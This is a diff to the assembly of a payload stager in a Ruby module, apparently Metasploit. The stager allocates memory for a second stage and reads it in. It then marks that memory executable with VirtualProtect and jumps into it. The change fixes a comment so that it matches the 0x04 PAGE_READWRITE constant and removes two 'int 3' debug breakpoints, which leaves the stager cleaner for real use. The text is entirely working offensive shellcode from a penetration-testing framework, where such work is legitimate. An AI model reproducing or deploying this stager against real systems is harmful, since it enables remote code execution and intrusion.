@@ -251,9 +251,9 @@ module Msf
       end
 
       asm << %Q^
-        ; Alloc a RWX buffer for the second stage
+        ; Alloc a RW buffer for the second stage
         mov esi, [esi]          ; dereference the pointer to the second stage length
-        push 0x04               ; PAGE_EXECUTE_READWRITE
+        push 0x04               ; PAGE_READWRITE
         push 0x1000             ; MEM_COMMIT
         push esi                ; push the newly recieved second stage length.
         push 0                  ; NULL as we dont care where the allocation is.
@@ -310,7 +310,6 @@ module Msf
         sub esi, eax            ; length -= bytes_received, will set flags
         jnz read_more           ; continue if we have more to read
         ;
-        int 3
         pushad                  ; preserve all registers
         mov ebx, [esp+0x20]     ; preserve lpAddress (memory address for second stage)
         mov esi, [esp+0x24]     ; preserve dwSize
@@ -323,7 +322,6 @@ module Msf
         call ebp                ; VirtualProtect( lpAddress, dwSize, PAGE_EXECUTE, lpflOldProtect )
         pop eax                 ; remove artifact from stack (return value of VirtualProtect is also on the stack)
         popad                   ; restore all registers back to initial state
-        int 3
         ;
         ret                     ; return into the second stage
 
